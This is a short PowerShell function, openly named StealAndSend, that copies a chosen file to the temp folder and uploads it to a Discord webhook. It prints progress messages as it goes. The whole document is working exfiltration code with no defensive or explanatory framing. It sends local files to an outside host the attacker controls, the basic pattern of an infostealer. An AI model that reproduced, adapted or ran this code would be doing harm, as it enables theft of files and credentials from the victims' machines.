function StealAndSend {
    param (
        [string]$FileSource,
        [string]$WebhookUrl
    )

    try {
        Write-Host "[~] Checking file: $FileSource" -ForegroundColor Yellow
        if (!(Test-Path $FileSource)) {
            Write-Host "[!] File not found: $FileSource" -ForegroundColor Red
            exit 1
        }

        $fileName = [System.IO.Path]::GetFileName($FileSource)
        $tempFile = "$env:TEMP\$fileName"
        Copy-Item $FileSource $tempFile -Force

        Write-Host "[~] Preparing upload to Discord..." -ForegroundColor Yellow

        $FileStream = [System.IO.File]::OpenRead($tempFile)
        $HttpClient = New-Object System.Net.Http.HttpClient
        $Content = New-Object System.Net.Http.MultipartFormDataContent
        $FileContent = New-Object System.Net.Http.StreamContent($FileStream)
        $Content.Add($FileContent, 'file', $fileName)

        $Response = $HttpClient.PostAsync($WebhookUrl, $Content).Result

        if ($Response.IsSuccessStatusCode) {
            Write-Host "[+] Upload successful." -ForegroundColor Green
        } else {
            Write-Host "[!] Upload failed: $($Response.StatusCode)" -ForegroundColor Red
            exit 1
        }

        $FileStream.Close()
        $HttpClient.Dispose()
    } catch {
        Write-Host "[!] Exception: $_" -ForegroundColor Red
        exit 1
    }
}
